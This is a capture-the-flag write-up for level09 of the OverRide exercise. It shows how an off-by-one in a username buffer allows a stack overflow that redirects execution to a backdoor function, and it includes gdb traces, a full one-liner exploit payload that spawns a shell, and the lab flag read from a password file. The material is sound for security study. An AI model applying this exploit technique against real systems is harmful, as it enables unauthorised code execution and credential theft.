HOW TO FIND THE FLAG:

After analysing the binary file and reverse engineered it, we can see there is 5 functions : main, set_username, set_msg, handle_msg and secret_backdoor.

The goal here is to find a way to call the secret_backdoor function in which there is a call to system. We want to call this function and to pass the argument "/bin/sh" in order to execute a shell.

The function handle_msg is called in the main function.

A structure is allocated on the stack with inside a char buffer of size 140, a buffer of size 40 and an int.

Calls to set_username and set_msg which take the adress of the structure in order to change what is inside.

We are going to exploit the fact that the set_username allows us to go past the index 39 of username buffer and change the value of msglen. Then we would be able to overflow the strncpy because the msglen value will be superior to msg size (140).

First we make the program SEGFAULT

(gdb) r <<< `python -c 'print "\xff" * 41 + "\n"'`

Now we are going to find the offset for the second argument

with wiremask we generate a pattern of 300 and we put a breakpoint at *set_msg+153

gdb) b *set_msg+153
Breakpoint 1 at 0x5555555549cb
(gdb) r <<< `python -c 'print "\xff" * 41 + "\n" + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9"'`
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/users/level09/level09 <<< `python -c 'print "\xff" * 41 + "\n" + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9"'`
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, �����������������������������������������>: Msg @Unix-Dude

Breakpoint 1, 0x00005555555549cb in set_msg ()

(gdb) x/s $rax
0x7fffffffe510:	 "c8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4"...
(gdb) c
Continuing.
>>: >: Msg sent!

Program received signal SIGSEGV, Segmentation fault.
0x0000555555554931 in handle_msg ()
(gdb) x/s $rsp
0x7fffffffe5d8:	 "Aj5Aj6Aj7Aj8Aj9\n"

We see that there is 200 chars before the segfault occurs.

The payload will be of the form : "\xff" * 41 + "\n" + 200 CHARS + adress of secret_backdoor + "\n" + "/bin/sh"

(gdb) info functions secret_backdoor
All functions matching regular expression "secret_backdoor":

Non-debugging symbols:
0x000055555555488c  secret_backdoor

level09@OverRide:~$ (python -c 'print "\xff" * 41 + "\n" + "A" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "\n" + "/bin/sh"'; cat) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, �����������������������������������������>: Msg @Unix-Dude
>>: >: Msg sent!
whoami
end
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
